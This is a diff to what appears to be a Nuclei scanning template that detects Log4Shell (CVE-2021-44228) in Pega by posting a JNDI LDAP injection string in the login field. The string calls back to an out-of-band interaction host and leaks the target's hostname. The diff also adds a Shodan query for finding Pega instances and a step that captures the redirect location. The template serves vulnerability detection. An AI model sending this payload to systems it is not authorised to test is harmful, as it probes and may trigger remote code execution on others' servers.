@@ -2,7 +2,7 @@ id: pega-log4j-rce
 
 info:
   name: Pega - Remote Code Execution (Apache Log4j)
-  author: shaikhyaser, yaser_s
+  author: shaikhyaser
   severity: critical
   description: |
     Pega is susceptible to Log4j JNDI remote code execution. Pega provides a powerful low-code platform that empowers the world's leading enterprises to Build for Change.
@@ -14,24 +14,30 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
-    verified: true
+    shodan-query: title:"Pega"
     max-request: 1
   tags: cve,cve2021,rce,jndi,log4j,pega,oast,kev
+
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
 
 http:
   - raw:
       - |
-        POST /prweb/app/default/_56mEsR4RqBouCrZGfkkFF8v406BUOZt/!STANDARD HTTP/1.1
+        GET /prweb/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        POST {{location}} HTTP/1.1
         Host: {{Hostname}}
         Origin: {{RootURL}}
-        Referer: {{RootURL}}/prweb/app/default/_56mEsR4RqBouCrZGfkkFF8v406BUOZt*/!STANDARD
+        Referer: {{location}}
         Content-Type: application/x-www-form-urlencoded
-        Connection: close
 
-        pzAuth=guest&UserIdentifier=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&Password=a&pyActivity%3DCode-Security.Login=&lockScreenID=&lockScreenPassword=&newPassword=&confirmNewPassword=
+        pzAuth=guest&UserIdentifier=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&Password=a&pyActivity%3DCode-Security.Login=&lockScreenID=&lockScreenPassword=&newPassword=&confirmNewPassword=
 
     matchers-condition: and
     matchers:
@@ -61,3 +67,10 @@ http:
         regex:
           - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
         part: interactsh_request
+
+      - type: kval
+        kval:
+          - location
+        internal: true
+        name: location
+        part: header_1
